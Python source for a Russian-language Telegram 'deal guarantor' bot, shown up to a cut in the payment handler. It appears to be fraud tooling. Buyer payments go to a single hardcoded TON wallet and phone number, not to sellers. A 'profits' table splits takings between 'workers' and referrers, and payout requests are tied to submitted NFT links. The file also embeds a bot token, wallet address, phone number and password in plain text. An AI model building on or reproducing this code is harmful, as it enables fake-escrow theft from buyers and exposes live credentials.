import sqlite3
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, WebAppInfo
from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackQueryHandler, ContextTypes
from telegram.error import NetworkError, BadRequest
import uuid
from datetime import datetime
import logging
import os
import aiohttp
import json
import requests
import time
from typing import Optional, Dict, Tuple
from messages import get_text

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S',
    handlers=[
        logging.FileHandler('bot.log'),
        logging.StreamHandler()
    ]
)

logger = logging.getLogger(__name__)

BOT_TOKEN = "8660611374:AAGl9vKe8fuzm-qFuZt2FCq52GypPJqQXoU"
SUPER_ADMIN_IDS = {8795006636}
VALUTE = "TON"
TON_ADDRESS = "UQAnpaA8kyZFeUUjpUp8WCiaAulurVz5lO9nG99EaYSMCWal"
SBP_CARD = "+79241197638 - YooMoney"

# Каналы и OTC боты
PROFITS_CHANNEL = "https://t.me/+iwRp8RTiEqo0MmYy"
PAYOUTS_CHANNEL = "https://t.me/+8PFrtYwmUvNlMDEy"
GIFTGUARANT_BOT = "@giftguarantoffcbot"

# Переменная для хранения ID чата уведомлений
NOTIFICATION_CHAT_ID = -1003976429329

# Пароль для доступа к командам ангелов
ANGELS_PASSWORD = "angels2026"
authorized_angels = set()  # Множество авторизованных ангелов

user_data = {}
deals = {}
admin_commands = {}
ADMIN_ID = set()
profits = {}
payout_requests = {}

# helper functions ---------------------------------------------------------

def sanitize_nft_text(text: str) -> str:
    """Убирает из строки любые упоминания об изображениях.

    Иногда рабочие вставляют в поле "ссылка на NFT" длинный список с
    префиксом "Изображение ..." (см. сообщение пользователя). Эти строки
    мешают автопрофиту/автовыплатам, поэтому мы чистим текст здесь.

    Правило простое: удаляем все строки, в которых встречается слово
    "Изображение" и обрезаем лишние пробелы.
    """
    if not text:
        return ""
    lines = text.splitlines()
    cleaned = [line for line in lines if "Изображение" not in line]
    return "\n".join(cleaned).strip()

# -------------------------------------------------------------------------

# Getgems API constants
GETGEMS_API_URL = "https://api.getgems.io/graphql"
PORTALS_COLLECTION_ADDRESS = "EQDAu7D1gWJbZgD4tJG23-6W08sknEJCvYP7Xmb0uWR0PvIi"  # Portals collection on TON

# Cache for floor prices (address -> (price, timestamp))
floor_price_cache: Dict[str, Tuple[Optional[float], float]] = {}

# manual override which can be set by an admin via /setfloor or by
# sending a message containing a TON price. This is kept in memory
# and used when calculating payouts or replying to /floor command.
manual_floor_price: Optional[float] = None

DB_NAME = 'bot_data.db'

def init_db():
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            ton_wallet TEXT,
            card_details TEXT,
            balance REAL,
            successful_deals INTEGER,
            lang TEXT,
            granted_by INTEGER,
            is_admin INTEGER DEFAULT 0
        )
    ''')

    cursor.execute("PRAGMA table_info(users)")
    columns = [column[1] for column in cursor.fetchall()]
    if 'ton_wallet' not in columns:
        cursor.execute('ALTER TABLE users ADD COLUMN ton_wallet TEXT')
    if 'card_details' not in columns:
        cursor.execute('ALTER TABLE users ADD COLUMN card_details TEXT')
    if 'lang' not in columns:
        cursor.execute('ALTER TABLE users ADD COLUMN lang TEXT DEFAULT "ru"')
    if 'granted_by' not in columns:
        cursor.execute('ALTER TABLE users ADD COLUMN granted_by INTEGER')
    if 'is_admin' not in columns:
        cursor.execute('ALTER TABLE users ADD COLUMN is_admin INTEGER DEFAULT 0')

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS deals (
            deal_id TEXT PRIMARY KEY,
            amount REAL,
            description TEXT,
            seller_id INTEGER,
            buyer_id INTEGER,
            status TEXT,
            payment_method TEXT
        )
    ''')

    cursor.execute("PRAGMA table_info(deals)")
    columns = [column[1] for column in cursor.fetchall()]
    if 'payment_method' not in columns:
        cursor.execute('ALTER TABLE deals ADD COLUMN payment_method TEXT')

    # Таблица для настроек бота
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS bot_settings (
            setting_name TEXT PRIMARY KEY,
            setting_value TEXT
        )
    ''')

    # Таблица для логирования профитов
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS profits (
            profit_id INTEGER PRIMARY KEY AUTOINCREMENT,
            worker_name TEXT,
            bot_username TEXT,
            nft_count INTEGER,
            total_amount REAL,
            payout_percent REAL,
            worker_share REAL,
            referral_share REAL,
            referral_name TEXT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    ''')

    # Таблица для заявок на выплату
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS payout_requests (
            request_id TEXT PRIMARY KEY,
            user_id INTEGER,
            wallet TEXT,
            nft_link TEXT,
            screenshot TEXT,
            amount REAL,
            status TEXT,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
            approved_at DATETIME,
            approved_by INTEGER
        )
    ''')

    # Добавляем столбцы, если таблица существует, но они отсутствуют
    cursor.execute("PRAGMA table_info(payout_requests)")
    columns = [column[1] for column in cursor.fetchall()]
    if 'wallet' not in columns:
        cursor.execute('ALTER TABLE payout_requests ADD COLUMN wallet TEXT')
    if 'nft_link' not in columns:
        cursor.execute('ALTER TABLE payout_requests ADD COLUMN nft_link TEXT')
    if 'screenshot' not in columns:
        cursor.execute('ALTER TABLE payout_requests ADD COLUMN screenshot TEXT')
    if 'request_id' not in columns:
        cursor.execute('ALTER TABLE payout_requests ADD COLUMN request_id TEXT')

    conn.commit()
    conn.close()

def load_data():
    global ADMIN_ID, NOTIFICATION_CHAT_ID
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    
    cursor.execute('SELECT user_id, ton_wallet, card_details, balance, successful_deals, lang, granted_by, is_admin FROM users')
    rows = cursor.fetchall()
    for row in rows:
        user_id, ton_wallet, card_details, balance, successful_deals, lang, granted_by, is_admin = row
        user_data[user_id] = {
            'ton_wallet': ton_wallet,
            'card_details': card_details,
            'balance': balance,
            'successful_deals': successful_deals,
            'lang': lang or 'ru',
            'granted_by': granted_by,
            'is_admin': is_admin
        }
        if is_admin:
            ADMIN_ID.add(user_id)
    
    for super_admin_id in SUPER_ADMIN_IDS:
        if super_admin_id not in user_data:
            user_data[super_admin_id] = {
                'ton_wallet': '',
                'card_details': '',
                'balance': 0.0,
                'successful_deals': 0,
                'lang': 'ru',
                'granted_by': None,
                'is_admin': 1
            }
            ADMIN_ID.add(super_admin_id)
            save_user_data(super_admin_id)
        elif not user_data[super_admin_id].get('is_admin'):
            user_data[super_admin_id]['is_admin'] = 1
            ADMIN_ID.add(super_admin_id)
            save_user_data(super_admin_id)

    cursor.execute('SELECT deal_id, amount, description, seller_id, buyer_id, status, payment_method FROM deals')
    rows = cursor.fetchall()
    for row in rows:
        deal_id, amount, description, seller_id, buyer_id, status, payment_method = row
        deals[deal_id] = {
            'amount': amount,
            'description': description,
            'seller_id': seller_id,
            'buyer_id': buyer_id,
            'status': status or 'active',
            'payment_method': payment_method
        }
    
    # Загружаем ID чата для уведомлений
    cursor.execute('SELECT setting_value FROM bot_settings WHERE setting_name = "notification_chat_id"')
    result = cursor.fetchone()
    if result:
        NOTIFICATION_CHAT_ID = int(result[0])
        logger.info(f"Загружен ID чата для уведомлений: {NOTIFICATION_CHAT_ID}")
    
    conn.close()
    logger.info(f"Загружены администраторы: {ADMIN_ID}")

def save_user_data(user_id):
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    user = user_data.get(user_id, {})
    cursor.execute('''
        INSERT OR REPLACE INTO users (user_id, ton_wallet, card_details, balance, successful_deals, lang, granted_by, is_admin)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?)
    ''', (user_id, user.get('ton_wallet', ''), user.get('card_details', ''), user.get('balance', 0.0), 
          user.get('successful_deals', 0), user.get('lang', 'ru'), user.get('granted_by', None), 
          user.get('is_admin', 0)))
    conn.commit()
    conn.close()

def ensure_user_exists(user_id):
    if user_id not in user_data:
        user_data[user_id] = {
            'ton_wallet': '',
            'card_details': '',
            'balance': 0.0,
            'successful_deals': 0,
            'lang': 'ru',
            'granted_by': None,
            'is_admin': 1 if user_id in SUPER_ADMIN_IDS else 0
        }
        save_user_data(user_id)
        if user_data[user_id]['is_admin']:
            ADMIN_ID.add(user_id)

def validate_ton_wallet(wallet_address: str) -> tuple[bool, str]:
    """
    Валидирует адрес TON кошелька.
    Возвращает (is_valid, error_message)
    
    Требования:
    - Начинается с EQ или UQ
    - Содержит ровно 48 символов
    """
    if not wallet_address:
        return False, "❌ Неверный адрес TON кошелька. Должен начинаться с EQ или UQ и содержать 48 символов."
    
    wallet_address = wallet_address.strip()
    
    # Проверяем начало адреса
    if not wallet_address.startswith(('EQ', 'UQ')):
        return False, "❌ Неверный адрес TON кошелька. Должен начинаться с EQ или UQ и содержать 48 символов."
    
    # Проверяем длину
    if len(wallet_address) != 48:
        return False, "❌ Неверный адрес TON кошелька. Должен начинаться с EQ или UQ и содержать 48 символов."
    
    return True, ""

async def get_user_display_name(context: ContextTypes.DEFAULT_TYPE, user_id: int) -> str:
    """
    Получает юзернейм пользователя, если нет - возвращает ID
    """
    try:
        user_chat = await context.bot.get_chat(user_id)
        return f"@{user_chat.username}" if user_chat.username else f"ID: {user_id}"
    except Exception:
        return f"ID: {user_id}"

def save_deal(deal_id):
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    deal = deals.get(deal_id, {})
    cursor.execute('''
        INSERT OR REPLACE INTO deals (deal_id, amount, description, seller_id, buyer_id, status, payment_method)
        VALUES (?, ?, ?, ?, ?, ?, ?)
    ''', (deal_id, deal.get('amount', 0.0), deal.get('description', ''), deal.get('seller_id', None), 
          deal.get('buyer_id', None), deal.get('status', 'active'), deal.get('payment_method', None)))
    conn.commit()
    conn.close()

def delete_deal(deal_id):
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute('DELETE FROM deals WHERE deal_id = ?', (deal_id,))
    conn.commit()
    conn.close()

def save_bot_setting(setting_name, setting_value):
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute('''
        INSERT OR REPLACE INTO bot_settings (setting_name, setting_value)
        VALUES (?, ?)
    ''', (setting_name, setting_value))
    conn.commit()
    conn.close()

def add_profit(worker_name: str, bot_username: str, nft_count: int, total_amount: float, 
               payout_percent: float, worker_share: float, referral_share: float, referral_name: str):
    """Добавить записи о профите в БД"""
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute('''
        INSERT INTO profits (worker_name, bot_username, nft_count, total_amount, 
                           payout_percent, worker_share, referral_share, referral_name)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?)
    ''', (worker_name, bot_username, nft_count, total_amount, payout_percent, 
          worker_share, referral_share, referral_name))
    conn.commit()
    conn.close()

def create_payout_request(user_id: int, amount: float) -> int:
    """Создать заявку на выплату, вернуть ID заявки"""
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute('''
        INSERT INTO payout_requests (user_id, amount, status)
        VALUES (?, ?, 'pending')
    ''', (user_id, amount))
    request_id = cursor.lastrowid
    conn.commit()
    conn.close()
    return request_id

def get_pending_payout_requests():
    """Получить все заявки на выплату со статусом 'pending'"""
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute('''
        SELECT request_id, user_id, amount, created_at FROM payout_requests 
        WHERE status = 'pending' ORDER BY created_at ASC
    ''')
    requests = cursor.fetchall()
    conn.close()
    return requests

def approve_payout_request(request_id: int, admin_id: int):
    """Одобрить заявку на выплату"""
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute('''
        UPDATE payout_requests SET status = 'approved', approved_by = ?, approved_at = CURRENT_TIMESTAMP
        WHERE request_id = ?
    ''', (admin_id, request_id))
    conn.commit()
    conn.close()

def get_user_profit_stats(user_id: int) -> dict:
    """Получить статистику профита пользователя"""
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    
    # Получаем информацию о профитах как воркера
    cursor.execute('''
        SELECT 
            SUM(total_amount) as total_amount,
            SUM(worker_share) as total_profit,
            SUM(referral_share) as referral_income,
            COUNT(*) as transactions_count,
            SUM(nft_count) as nft_processed
        FROM profits 
        WHERE worker_name LIKE ?
    ''', (f"%{user_id}%",))
    
    result = cursor.fetchone()
    worker_stats = {
        'total_amount': result[0] or 0.0,
        'total_profit': result[1] or 0.0,
        'referral_income': result[2] or 0.0,
        'transactions': result[3] or 0,
        'nft_processed': result[4] or 0
    }
    
    # Получаем выплаченные суммы
    cursor.execute('''
        SELECT SUM(amount) FROM payout_requests 
        WHERE user_id = ? AND status = 'approved'
    ''', (user_id,))
    
    paid_result = cursor.fetchone()
    total_paid = paid_result[0] or 0.0
    
    # Получаем ожидающие выплаты
    cursor.execute('''
        SELECT SUM(amount) FROM payout_requests 
        WHERE user_id = ? AND status = 'pending'
    ''', (user_id,))
    
    pending_result = cursor.fetchone()
    total_pending = pending_result[0] or 0.0
    
    conn.close()
    
    return {
        'total_amount': worker_stats['total_amount'],
        'total_profit': worker_stats['total_profit'],
        'referral_income': worker_stats['referral_income'],
        'transactions': worker_stats['transactions'],
        'nft_processed': worker_stats['nft_processed'],
        'total_paid': total_paid,
        'total_pending': total_pending,
        'available_to_withdraw': worker_stats['total_profit'] - total_paid
    }

async def get_nft_floor_prices() -> dict:
    """Получить floor цены с маркетплейсов NFT"""
    prices = {
        'giftguarant': None,
        'telegram': None,
        'error': None
    }
    
    try:
        # Попытка получить цены с публичных API (если они доступны)
        # Это демонстрационные цены - используйте реальные API если доступны
        async with aiohttp.ClientSession() as session:
            try:
                # Пример запроса к Lolz (может потребоваться API ключ)
                async with session.get('https://api.lzt.market/v1/nft/floor', timeout=aiohttp.ClientTimeout(total=5)) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        prices['lolz'] = data.get('floor_price', 0)
            except Exception as e:
                logger.debug(f"Ошибка при получении цены Lolz: {e}")
    
    except Exception as e:
        logger.debug(f"Ошибка при получении рыночных цен: {e}")
        prices['error'] = str(e)
    
    # Если живые цены недоступны, возвращаем примерные значения
    if not prices['giftguarant']:
        prices['giftguarant'] = 4.75
    if not prices['telegram']:
        prices['telegram'] = 4.80
    
    return prices

def get_floor(collection_address: str, cache_ttl: int = 60) -> Optional[float]:
    """
    Получить минимальную цену листинга коллекции NFT с Getgems.
    
    Args:
        collection_address: Адрес контракта коллекции на TON блокчейне
        cache_ttl: Время жизни кеша в секундах (по умолчанию 60)
    
    Returns:
        Цена floor в TON или None если листингов не найдено
    """
    current_time = time.time()
    
    # Проверяем кеш
    if collection_address in floor_price_cache:
        cached_price, cached_timestamp = floor_price_cache[collection_address]
        if current_time - cached_timestamp < cache_ttl:
            logger.debug(f"Используется кешированная цена для {collection_address}: {cached_price} TON")
            return cached_price
    
    graphql_query = """
    query GetFloor($collectionAddress: String!) {
        nftListings(
            first: 1
            sort: PRICE_ASC
            filter: {
                collectionAddress: $collectionAddress
                saleType: sale
                isActive: true
            }
        ) {
            edges {
                node {
                    price
                }
            }
        }
    }
    """
    
    try:
        response = requests.post(
            GETGEMS_API_URL,
            json={
                "query": graphql_query,
                "variables": {
                    "collectionAddress": collection_address
                }
            },
            timeout=10,
            headers={
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Referer": "https://getgems.io",
                "Origin": "https://getgems.io",
                "Accept": "application/json",
                "Accept-Language": "en-US,en;q=0.9",
                "Cache-Control": "no-cache",
                "Pragma": "no-cache"
            }
        )
        response.raise_for_status()
        
        data = response.json()
        
        if "errors" in data:
            error_message = data["errors"][0].get("message", "Unknown error") if data["errors"] else "Unknown error"
            logger.warning(f"GraphQL error для {collection_address}: {error_message}")
            floor_price_cache[collection_address] = (None, current_time)
            return None
        
        listings = data.get("data", {}).get("nftListings", {}).get("edges", [])
        
        if not listings:
            logger.info(f"Нет активных листингов для {collection_address}")
            floor_price_cache[collection_address] = (None, current_time)
            return None
        
        # Получаем цену первого листинга (минимальная)
        price_in_nanoton = listings[0]["node"].get("price")
        
        if price_in_nanoton is None:
            logger.warning(f"Цена не найдена в ответе API для {collection_address}")
            floor_price_cache[collection_address] = (None, current_time)
            return None
        
        # Конвертируем nanoton -> TON (1 TON = 10^9 nanoton)
        price_in_ton = float(price_in_nanoton) / 1e9
        
        # Сохраняем в кеш
        floor_price_cache[collection_address] = (price_in_ton, current_time)
        
        logger.info(f"Floor цена для {collection_address}: {price_in_ton} TON")
        return price_in_ton
    
    except requests.exceptions.HTTPError as e:
        if hasattr(e, 'response') and e.response.status_code == 403:
            logger.warning(f"API возвращает 403 Forbidden - возможно требуется авторизация")
        else:
            logger.error(f"HTTP error при запросе floor")
        floor_price_cache[collection_address] = (None, current_time)
        return None
    except requests.exceptions.Timeout:
        logger.error(f"Timeout при запросе floor для {collection_address}")
        floor_price_cache[collection_address] = (None, current_time)
        return None
    except requests.exceptions.ConnectionError as e:
        logger.error(f"Connection error при запросе floor: {e}")
        floor_price_cache[collection_address] = (None, current_time)
        return None
    except ValueError as e:
        logger.error(f"JSON decode error: {e}")
        floor_price_cache[collection_address] = (None, current_time)
        return None
    except Exception as e:
        logger.error(f"Ошибка при получении floor цены для {collection_address}: {e}", exc_info=True)
        floor_price_cache[collection_address] = (None, current_time)
        return None

async def send_notification_to_chat(context: ContextTypes.DEFAULT_TYPE, message: str):
    global NOTIFICATION_CHAT_ID
    if NOTIFICATION_CHAT_ID:
        try:
            await context.bot.send_message(
                chat_id=NOTIFICATION_CHAT_ID,
                text=message,
                parse_mode="HTML"
            )
        except Exception as e:
            logger.error(f"Ошибка при отправке уведомления в чат {NOTIFICATION_CHAT_ID}: {e}")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = None
    user_id = None
    
    try:
        if update.message:
            user_id = update.message.from_user.id
            chat_id = update.message.chat_id
            args = context.args
        elif update.callback_query:
            user_id = update.callback_query.from_user.id
            chat_id = update.callback_query.message.chat_id
            args = []
        else:
            return

        ensure_user_exists(user_id)
        lang = user_data.get(user_id, {}).get('lang', 'ru')

        if args and args[0] in deals:
            deal_id = args[0]
            deal = deals[deal_id]
            seller_id = deal['seller_id']
            
            # Проверяем, не пытается ли пользователь присоединиться к своей сделке
            if user_id == seller_id:
                await context.bot.send_message(
                    chat_id,
                    "🚫 Вы не можете присоединиться к своей собственной сделке.",
                    parse_mode="HTML"
                )
                keyboard = [
                    [InlineKeyboardButton(get_text(lang, "wallet_button"), callback_data='wallet_menu')],
                    [InlineKeyboardButton(get_text(lang, "create_deal_button"), callback_data='create_deal')],
                    [InlineKeyboardButton(get_text(lang, "my_deals_button"), callback_data='my_deals')],
                    [InlineKeyboardButton(get_text(lang, "settings_button"), callback_data='settings')],
                ]
                if user_id in ADMIN_ID:
                    keyboard.append([InlineKeyboardButton("🔧 Админ-панель", callback_data='admin_panel')])

                reply_markup = InlineKeyboardMarkup(keyboard)
                welcome_message = get_text(lang, "welcome_start")
                
                await context.bot.send_message(
                    chat_id,
                    welcome_message,
                    parse_mode="HTML",
                    reply_markup=reply_markup
                )
                return
            
            try:
                seller_chat = await context.bot.get_chat(seller_id)
                seller_username = seller_chat.username or "Неизвестно"
            except Exception as e:
                logger.error(f"Could not get chat for seller_id {seller_id}: {e}")
                seller_username = "Неизвестно"
            
            deals[deal_id]['buyer_id'] = user_id
            deals[deal_id]['status'] = 'active'
            save_deal(deal_id)

            payment_method = deal.get('payment_method', 'ton')
            payment_instruction = "Инструкция по оплате не определена."

            if payment_method == 'ton':
                payment_details = TON_ADDRESS
                payment_instruction = get_text(lang, "deal_info_ton_message",
                                               deal_id=deal_id,
                                               seller_username=seller_username,
                                               successful_deals=user_data.get(seller_id, {}).get('successful_deals', 0),
                                               description=deal['description'],
                                               wallet=payment_details,
                                               amount=deal['amount'])
            elif payment_method == 'sbp':
                payment_details = SBP_CARD
                payment_instruction = get_text(lang, "deal_info_sbp_message",
                                               deal_id=deal_id,
                                               seller_username=seller_username,
                                               successful_deals=user_data.get(seller_id, {}).get('successful_deals', 0),
                                               description=deal['description'],
                                               card=payment_details,
                                               amount=deal['amount'])
            elif payment_method == 'stars':
                bot_username = (await context.bot.get_me()).username
                payment_details = f"/pay @{bot_username} {deal['amount']}"
                payment_instruction = get_text(lang, "deal_info_stars_message",
                                               deal_id=deal_id,
                                               seller_username=seller_username,
                                               successful_deals=user_data.get(seller_id, {}).get('successful_deals', 0),
                                               description=deal['description'],
                                               command=payment_details,
                                               amount=deal['amount'])

            if not payment_instruction:
                logger.error(f"Empty message text for deal_id {deal_id}, payment_method {payment_method}")
                await context.bot.send_message(chat_id, "🚫 Ошибка: текст сообщения не найден.", parse_mode="HTML")
                return

            await context.bot.send_message(
                chat_id,
                payment_instruction,
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton(get_text(lang, "pay_from_balance_button"), callback_data=f'pay_from_balance_{deal_id}')],
                    [InlineKeyboardButton(get_text(lang, "menu_button"), callback_data='menu_from_deal')]
                ])
            )
            
            # Отправляем видео присоединения к сделке
            try:
                with open('video/buyer_joined.mp4', 'rb') as video_file:
                    await context.bot.send_video(
                        chat_id,
                        video=video_file,
                        caption="✅ Вы присоединились к сделке",
                        parse_mode="HTML"
                    )
            except Exception as e:
                logger.error(f"Ошибка при отправке видео присоединения: {e}")

            try:
                buyer_chat = await context.bot.get_chat(user_id)
                buyer_username = buyer_chat.username or "Неизвестно"
            except Exception as e:
                logger.error(f"Could not get chat for buyer_id {user_id}: {e}")
                buyer_username = "Неизвестно"

            await context.bot.send_message(
                seller_id,
                get_text(lang, "seller_notification_message",
                         buyer_username=buyer_username,
                         deal_id=deal_id,
                         successful_deals=user_data.get(user_id, {}).get('successful_deals', 0)),
                parse_mode="HTML"
            )
            
            # Отправляем уведомление о новой сделке
            seller_display = await get_user_display_name(context, seller_id)
            buyer_display = await get_user_display_name(context, user_id)
            notification_text = (
                f"🆕 Новая сделка создана\n"
                f"ID: #{deal_id}\n"
                f"Сумма: {deal['amount']} {deal['payment_method'].upper()}\n"
                f"Продавец: {seller_display}\n"
                f"Покупатель: {buyer_display}"
            )
            await send_notification_to_chat(context, notification_text)
            return

        keyboard = [
            [InlineKeyboardButton(get_text(lang, "wallet_button"), callback_data='wallet_menu')],
            [InlineKeyboardButton(get_text(lang, "create_deal_button"), callback_data='create_deal')],
            [InlineKeyboardButton(get_text(lang, "my_deals_button"), callback_data='my_deals')],
            [InlineKeyboardButton(get_text(lang, "settings_button"), callback_data='settings')],
        ]
        if user_id in ADMIN_ID:
            keyboard.append([InlineKeyboardButton("🔧 Админ-панель", callback_data='admin_panel')])

        reply_markup = InlineKeyboardMarkup(keyboard)
        
        welcome_message = get_text(lang, "welcome_start")
        
        # Выбираем видео в зависимости от языка
        video_file = 'video/welcome_eng.mp4' if lang == 'en' else 'video/welcome.mp4'
        
        try:
            with open(video_file, 'rb') as vf:
                await context.bot.send_video(
                    chat_id,
                    video=vf,
                    caption=welcome_message,
                    parse_mode="HTML",
                    reply_markup=reply_markup
                )
        except Exception as e:
            logger.error(f"Ошибка при отправке видео приветствия: {e}")
            await context.bot.send_message(
                chat_id,
                welcome_message,
                parse_mode="HTML",
                reply_markup=reply_markup
            )
    except (NetworkError, BadRequest) as e:
        logger.error(f"Telegram API error in start: {e}", exc_info=True)
        if chat_id:
            await context.bot.send_message(chat_id, "🚫 Ошибка сети. Пожалуйста, попробуйте позже.", parse_mode="HTML")
    except Exception as e:
        logger.error(f"Ошибка в функции start: {e}", exc_info=True)
        if chat_id:
            await context.bot.send_message(chat_id, "🚫 Произошла ошибка. Пожалуйста, попробуйте позже.", parse_mode="HTML")

async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global NOTIFICATION_CHAT_ID
    
    query = update.callback_query
    if not query or not query.message:
        logger.warning("Callback query или message отсутствуют.")
        if query:
            try:
                await query.answer()
            except Exception:
                pass
        return
        
    chat_id = query.message.chat_id
    user_id = query.from_user.id
    data = query.data

    try:
        await query.answer()
        logger.info(f"Button callback_data received: {data}")
        
        ensure_user_exists(user_id)
        lang = user_data.get(user_id, {}).get('lang', 'ru')

        if data == 'menu':
            keyboard = [
                [InlineKeyboardButton(get_text(lang, "wallet_button"), callback_data='wallet_menu')],
                [InlineKeyboardButton(get_text(lang, "create_deal_button"), callback_data='create_deal')],
                [InlineKeyboardButton(get_text(lang, "my_deals_button"), callback_data='my_deals')],
                [InlineKeyboardButton(get_text(lang, "settings_button"), callback_data='settings')],
            ]
            if user_id in ADMIN_ID:
                keyboard.append([InlineKeyboardButton("🔧 Админ-панель", callback_data='admin_panel')])

            reply_markup = InlineKeyboardMarkup(keyboard)
            
            welcome_message = get_text(lang, "welcome_start")
            
            # Выбираем видео в зависимости от языка
            video_file = 'video/welcome_eng.mp4' if lang == 'en' else 'video/welcome.mp4'
            
            try:
                with open(video_file, 'rb') as vf:
                    await query.message.delete()
                    await context.bot.send_video(
                        chat_id,
                        video=vf,
                        caption=welcome_message,
                        parse_mode="HTML",
                        reply_markup=reply_markup
                    )
            except Exception as e:
                logger.error(f"Ошибка при отправке видео меню: {e}")

            return
        
        if data == 'menu_from_deal':
            await start(update, context)
            return

        elif data == 'wallet_menu':
            keyboard = [
                [InlineKeyboardButton(get_text(lang, "add_ton_wallet_button"), callback_data='add_ton_wallet')],
                [InlineKeyboardButton(get_text(lang, "add_card_button"), callback_data='add_card')],
                [InlineKeyboardButton(get_text(lang, "menu_button"), callback_data='menu')]
            ]
            message_text = get_text(lang, "wallet_menu_message")
            video_file = 'video/wallet_eng.mp4' if lang == 'en' else 'video/wallet_ru.mp4'
            try:
                with open(video_file, 'rb') as vf:
                    await query.message.delete()
                    await context.bot.send_video(
                        chat_id,
                        video=vf,
                        caption=message_text,
                        parse_mode="HTML",
                        reply_markup=InlineKeyboardMarkup(keyboard)
                    )
            except Exception as e:
                logger.error(f"Ошибка при отправке видео кошелька: {e}")
                await query.edit_message_caption(
                    caption=message_text,
                    parse_mode="HTML",
                    reply_markup=InlineKeyboardMarkup(keyboard)
                )

        elif data == 'add_ton_wallet':
            current_wallet = user_data.get(user_id, {}).get('ton_wallet') or get_text(lang, "not_specified_wallet")
            message_text = get_text(lang, "add_ton_wallet_message", current_wallet=current_wallet)
            await query.edit_message_caption(
                caption=message_text,
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(get_text(lang, "menu_button"), callback_data='menu')]])
            )
            context.user_data['awaiting_ton_wallet'] = True

        elif data == 'add_card':
            current_card = user_data.get(user_id, {}).get('card_details') or get_text(lang, "not_specified_card")
            message_text = get_text(lang, "add_card_message", current_card=current_card)
            await query.edit_message_caption(
                caption=message_text,
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(get_text(lang, "menu_button"), callback_data='menu')]])
            )
            context.user_data['awaiting_card'] = True
        
        elif data == 'create_deal':
            if not user_data[user_id].get('ton_wallet') and not user_data[user_id].get('card_details'):
                message_text = get_text(lang, "no_requisites_message")
                await query.edit_message_caption(
                    caption=message_text,
                    parse_mode="HTML",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton(get_text(lang, "add_wallet_button"), callback_data='wallet_menu')],
                        [InlineKeyboardButton(get_text(lang, "menu_button"), callback_data='menu')]
                    ])
                )
                return
            keyboard = [
                [InlineKeyboardButton(get_text(lang, "payment_ton_button"), callback_data='payment_method_ton')],
                [InlineKeyboardButton(get_text(lang, "payment_sbp_button"), callback_data='payment_method_sbp')],
                [InlineKeyboardButton(get_text(lang, "payment_stars_button"), callback_data='payment_method_stars')],
                [InlineKeyboardButton(get_text(lang, "menu_button"), callback_data='menu')]
            ]
            message_text = get_text(lang, "choose_payment_method_message")
            video_file = 'video/create_deal_eng.mp4' if lang == 'en' else 'video/create_deal_ru.mp4'
            try:
                with open(video_file, 'rb') as vf:
                    await query.message.delete()
                    await context.bot.send_video(
                        chat_id,
                        video=vf,
                        caption=message_text,
                        parse_mode="HTML",
                        reply_markup=InlineKeyboardMarkup(keyboard)
                    )
            except Exception as e:
                logger.error(f"Ошибка при отправке видео создания сделки: {e}")
                await query.edit_message_caption(
                    caption=message_text,
                    parse_mode="HTML",
                    reply_markup=InlineKeyboardMarkup(keyboard)
                )

        elif data.startswith('payment_method_'):
            payment_method = data.split('_')[-1]
            context.user_data['payment_method'] = payment_method
            valute_for_message = "TON" if payment_method == "ton" else "RUB" if payment_method == "sbp" else "XTR"
            message_text = get_text(lang, "create_deal_message", valute=valute_for_message)
            await query.edit_message_caption(
                caption=message_text,
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(get_text(lang, "menu_button"), callback_data='menu')]])
            )
            context.user_data['awaiting_amount'] = True

        elif data.startswith('pay_from_balance_'):
            deal_id = data.split('_')[-1]
            deal = deals.get(deal_id)
            if deal:
                buyer_id = user_id
                seller_id = deal.get('seller_id')
                amount = deal.get('amount')

                if not (buyer_id and seller_id and amount is not None):
                    logger.error(f"Invalid deal data: deal_id={deal_id}, buyer_id={buyer_id}, seller_id={seller_id}, amount={amount}")
                    await query.edit_message_text("🚫 Ошибка: неверные данные сделки.", parse_mode="HTML")
                    return

                ensure_user_exists(buyer_id)
                ensure_user_exists(seller_id)

                logger.info(f"Buyer {buyer_id} balance: {user_data[buyer_id].get('balance', 0)}, required amount: {amount}")
                if user_data[buyer_id].get('balance', 0) >= amount:
                    user_data[buyer_id]['balance'] -= amount
                    save_user_data(buyer_id)
